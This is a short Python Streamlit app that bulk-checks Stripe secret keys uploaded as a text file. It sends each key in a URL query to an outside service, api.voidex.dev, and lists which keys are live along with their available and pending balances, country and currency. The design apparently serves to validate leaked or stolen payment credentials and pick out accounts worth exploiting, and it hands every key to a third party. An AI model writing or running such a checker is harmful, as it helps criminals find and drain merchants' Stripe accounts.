import streamlit as st
import requests

def get_sk_info(secret_key: str) -> dict:
    url = f"https://api.voidex.dev/api/skinfo?sk={secret_key}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        st.error(f"Request failed: {e}")
        return None

def main():
    st.title("Stripe Secret Key Info")
    file_upload = st.file_uploader("Upload a text file with Stripe secret keys (one key per line):", type=["txt"])

    if file_upload:
        file_content = file_upload.read().decode("utf-8")
        secret_keys = [line.strip() for line in file_content.splitlines()]

        # Placeholders for live updates
        available_balance_placeholder = st.empty()
        integration_off_placeholder = st.empty()
        invalid_key_placeholder = st.empty()

        available_balance_data = []
        integration_off_data = []
        invalid_key_data = []

        for secret_key in secret_keys:
            result = get_sk_info(secret_key)

            if result:
                if 'error' in result:
                    if result['error'] == 'Failed to fetch account data':
                        invalid_key_data.append(f"Secret Key: {secret_key} - Status: Invalid key")
                    elif result['error'] == 'Your account cannot currently make live charges.':
                        integration_off_data.append(
                            f"Secret Key: {secret_key} - Status: Integration off - "
                            f"Country: {result.get('country', 'Not available')} - "
                            f"Default Currency: {result.get('default_currency', 'Not available')}"
                        )
                    else:
                        invalid_key_data.append(f"Secret Key: {secret_key} - Status: Error - Error: {result['error']}")
                else:
                    if 'available_balance' in result:
                        available_balance_data.append(
                            f"Secret Key: {secret_key} - Status: Key is live - "
                            f"Available Balance: {result['available_balance']} - "
                            f"Country: {result.get('country', 'Not available')} - "
                            f"Currency: {result.get('currency', 'Not available')} - "
                            f"Pending Balance: {result.get('pending_balance', 'Not available')}"
                        )
                    else:
                        invalid_key_data.append(f"Secret Key: {secret_key} - Status: Key is not present or available balance is not available.")
            else:
                invalid_key_data.append(f"Secret Key: {secret_key} - Status: Failed to retrieve information about the secret key.")

            # Update live on the page
            with available_balance_placeholder.container():
                for data in available_balance_data:
                    st.success(data)

            with integration_off_placeholder.container():
                for data in integration_off_data:
                    st.warning(data)

            with invalid_key_placeholder.container():
                for data in invalid_key_data:
                    st.error(data)

if __name__ == "__main__":
    main()